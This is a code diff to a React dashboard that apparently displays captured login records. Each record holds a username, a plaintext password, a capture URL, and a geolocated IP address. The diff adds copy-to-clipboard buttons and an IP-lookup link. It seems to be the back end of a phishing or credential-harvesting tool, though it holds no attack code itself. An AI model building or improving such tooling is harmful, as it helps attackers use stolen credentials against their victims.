@@ -29,6 +29,7 @@ import CloseIcon from 'material-ui-icons/Close';
 import { CircularProgress } from 'material-ui/Progress';
 import Slide from 'material-ui/transitions/Slide';
 import ReactJson from 'react-json-view';
+import {CopyToClipboard} from 'react-copy-to-clipboard';
 import { FormControlLabel, FormGroup } from 'material-ui/Form';
 import SyntaxHighlighter from 'react-syntax-highlighter';
 import { atomOneDark } from 'react-syntax-highlighter/styles/hljs';
@@ -355,7 +356,10 @@ class PersistentDrawer extends Component {
                           return (
                             <TableRow key={i}>
                               <TableCell className={classes.tableCell}>
-                                <Timestamp time={record.timestamp} format='ago' precision={this.props.parentState.width > 750 ? 3 : this.props.parentState.width > 600 ? 2 : 1} />
+                                <Timestamp time={record.timestamp}
+                                  format='ago'
+                                  precision={this.props.parentState.width > 600 ? 2 : 1}
+                                />
                               </TableCell>
                               <TableCell className={classes.tableCell}>
                                 {record.username}
@@ -408,29 +412,53 @@ class PersistentDrawer extends Component {
                         </Toolbar>
                       </AppBar>
                       <List className={classes.recordContent}>
-                        <ListItem>
-                          <ListItemText primary="Timestamp" secondary={<Timestamp time={this.state.record.timestamp} format='full' />} />
-                        </ListItem>
+                        <CopyToClipboard text={this.state.record.timestamp}
+                          onCopy={() => this.props.notify({
+                            title: "Copied to clipboard!",
+                            message: this.state.record.timestamp
+                          })}>
+                          <ListItem button>
+                            <ListItemText primary="Timestamp" secondary={<Timestamp time={this.state.record.timestamp} format='full' />} />
+                          </ListItem>
+                        </CopyToClipboard>
                         <Divider />
-                        <ListItem>
-                          <ListItemText primary="Username" secondary={this.state.record.username} />
-                        </ListItem>
+                        <CopyToClipboard text={this.state.record.username}
+                          onCopy={() => this.props.notify({
+                            title: "Copied to clipboard!",
+                            message: this.state.record.username
+                          })}>
+                          <ListItem button>
+                            <ListItemText primary="Username" secondary={this.state.record.username} />
+                          </ListItem>
+                        </CopyToClipboard>
                         <Divider />
-                        <ListItem>
-                          <ListItemText primary="Password" secondary={this.state.record.password} />
-                        </ListItem>
+                        <CopyToClipboard text={this.state.record.password}
+                          onCopy={() => this.props.notify({
+                            title: "Copied to clipboard!",
+                            message: this.state.record.password
+                          })}>
+                          <ListItem button>
+                            <ListItemText primary="Password" secondary={this.state.record.password} />
+                          </ListItem>
+                        </CopyToClipboard>
                         <Divider />
-                        <ListItem>
+                        <ListItem button onClick={() => {window.open(this.state.record.url).bind}}>
                           <ListItemText primary="Capture URL" secondary={this.state.record.url} />
                         </ListItem>
                         <Divider />
-                        <ListItem>
+                        <ListItem button onClick={() => {window.open("https://tools.keycdn.com/geo?host=" + this.state.record.ip.query)}}>
                           <ListItemText primary="IP Address" secondary={`${this.state.record.ip.query}${this.state.record.ip.country ? " (" + this.state.record.ip.city + " - " + this.state.record.ip.country + ")" : ""}`} />
                         </ListItem>
                         <Divider />
-                        <ListItem>
-                          <ListItemText primary="Screen resolution" secondary={`${this.state.record.browser.height}x${this.state.record.browser.width}px`} />
-                        </ListItem>
+                        <CopyToClipboard text={`${this.state.record.browser.height}x${this.state.record.browser.width}px`}
+                          onCopy={() => this.props.notify({
+                            title: "Copied to clipboard!",
+                            message: this.state.record.browser.height + "x" + this.state.record.browser.width + "px"
+                          })}>
+                          <ListItem button>
+                            <ListItemText primary="Screen resolution" secondary={`${this.state.record.browser.height}x${this.state.record.browser.width}px`} />
+                          </ListItem>
+                        </CopyToClipboard>
                         <Divider />
                         <br />
                         <ListItem>
